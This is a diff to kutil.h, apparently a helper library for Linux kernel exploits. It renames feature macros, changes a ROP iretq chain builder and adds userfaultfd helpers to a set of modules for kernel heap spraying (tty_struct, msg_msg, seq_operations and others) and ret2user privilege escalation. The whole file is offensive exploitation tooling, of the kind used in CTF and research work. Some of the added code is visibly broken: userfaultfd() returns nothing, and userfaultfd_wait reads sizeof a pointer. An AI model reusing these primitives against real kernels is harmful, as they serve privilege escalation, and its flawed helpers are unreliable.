@@ -1,14 +1,15 @@
 #ifndef __KUTIL_H__
 #define __KUTIL_H__
 
-#define USE_SEQ_OPERATIONS
-#define USE_SHM_FILE_DATA
-#define USE_TIMERFD_CTX
-#define USE_TTY_STRUCT
-#define USE_MSG_MSG
-#define USE_ROP
-#define USE_COMM
-#define USE_DUMP
+#define ENABLE_SEQ_OPERATIONS
+#define ENABLE_SHM_FILE_DATA
+#define ENABLE_TIMERFD_CTX
+#define ENABLE_TTY_STRUCT
+#define ENABLE_MSG_MSG
+#define ENABLE_ROP
+#define ENABLE_USERFAULTFD
+#define ENABLE_COMM
+#define ENABLE_DUMP
 
 #define PAGE_SIZE 0x1000
 
@@ -23,7 +24,7 @@
   } while (0)
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-#if defined(USE_SEQ_OPERATIONS)
+#ifdef ENABLE_SEQ_OPERATIONS
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -41,7 +42,7 @@ int kmalloc32_seq_operations() {
 void kfree_seq_operations(int fd) { close(fd); }
 #endif
 
-#if defined(USE_SHM_FILE_DATA)
+#ifdef ENABLE_SHM_FILE_DATA
 #include <sys/ipc.h>
 #include <sys/shm.h>
 
@@ -60,7 +61,7 @@ int kmalloc32_shm_file_data() {
 }
 #endif
 
-#if defined(USE_TIMERFD_CTX)
+#ifdef ENABLE_TIMERFD_CTX
 #include <sys/timerfd.h>
 #include <unistd.h>
 
@@ -84,7 +85,7 @@ void kfree_timerfd_ctx(int fd) {
 }
 #endif
 
-#if defined(USE_TTY_STRUCT)
+#ifdef ENABLE_TTY_STRUCT
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <sys/types.h>
@@ -102,7 +103,7 @@ int kmalloc1024_tty_struct() {
 void kfree_tty_struct(int fd) { close(fd); }
 #endif
 
-#if defined(USE_MSG_MSG)
+#ifdef ENABLE_MSG_MSG
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/types.h>
@@ -116,7 +117,7 @@ void kfree_tty_struct(int fd) { close(fd); }
 #define MTEXTLEN_MSG(size) ((size)-HDRLEN_MSG)
 #define MTEXTLEN_MSGSEG(size) ((size) + PAGE_SIZE - HDRLEN_MSG - HDRLEN_MSGSEG)
 
-#if defined(__GLIBC__)
+#ifdef __GLIBC__
 struct msgbuf {
   long mtype;
   char mtext[1];
@@ -219,7 +220,7 @@ struct msgbuf *peek_msgseg(int msgid, size_t size) {
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-#ifdef USE_ROP
+#ifdef ENABLE_ROP
 #include <unistd.h>
 
 void shell() {
@@ -270,8 +271,7 @@ void ret2user() {
       ".att_syntax;");
 }
 
-void rop_iretq(unsigned long *p, unsigned long iretq) {
-  *p++ = iretq;
+void rop_iretq(unsigned long *p) {
   *p++ = user_ip;
   *p++ = user_cs;
   *p++ = user_rflags;
@@ -281,7 +281,84 @@ void rop_iretq(unsigned long *p, unsigned long iretq) {
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-#ifdef USE_COMM
+#ifdef ENABLE_USERFAULTFD
+#include <assert.h>
+#include <fcntl.h>
+#include <linux/userfaultfd.h>
+#include <poll.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int userfaultfd() {
+  int fd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+  if (fd == -1) {
+    ABORT("syscall");
+  }
+
+  struct uffdio_api uffdio_api;
+  uffdio_api.api = UFFD_API;
+  uffdio_api.features = 0;
+  int err = ioctl(fd, UFFDIO_API, &uffdio_api);
+  if (err == -1) {
+    ABORT("ioctl");
+  }
+}
+
+void userfaultfd_register(int fd, void *start, size_t len) {
+  assert(((unsigned long)start) % PAGE_SIZE == 0);
+  assert(len % PAGE_SIZE == 0);
+
+  struct uffdio_register uffdio_register;
+  uffdio_register.range.start = (unsigned long)start;
+  uffdio_register.range.len = len;
+  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+  int err = ioctl(fd, UFFDIO_REGISTER, &uffdio_register);
+  if (err == -1) {
+    ABORT("ioctl");
+  }
+}
+
+void userfaultfd_copy(int fd, void *dst, void *src) {
+  assert(((unsigned long)dst) % PAGE_SIZE == 0);
+
+  struct uffdio_copy uffdio_copy;
+  uffdio_copy.src = (unsigned long)src;
+  uffdio_copy.dst = (unsigned long)dst;
+  uffdio_copy.len = PAGE_SIZE;
+  uffdio_copy.mode = 0;
+  uffdio_copy.copy = 0;
+  int err = ioctl(fd, UFFDIO_COPY, &uffdio_copy);
+  if (err == -1) {
+    ABORT("ioctl");
+  }
+}
+
+void userfaultfd_wait(int fd, struct uffd_msg *uffd_msg) {
+  struct pollfd pollfd;
+  pollfd.fd = fd;
+  pollfd.events = POLLIN;
+
+  int err = poll(&pollfd, 1, -1);
+  if (err == -1) {
+    ABORT("poll");
+  }
+
+  ssize_t nread = read(fd, uffd_msg, sizeof(uffd_msg));
+  if (nread == -1) {
+    ABORT("read");
+  }
+
+  assert(nread == sizeof(uffd_msg));
+  assert(uffd_msg->event == UFFD_EVENT_PAGEFAULT);
+}
+
+#endif
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+#ifdef ENABLE_COMM
 #include <sys/prctl.h>
 
 void set_comm(char *name) {
@@ -292,7 +369,7 @@ void set_comm(char *name) {
 #endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-#ifdef USE_DUMP
+#ifdef ENABLE_DUMP
 #include <stdint.h>
 #include <stdio.h>
 
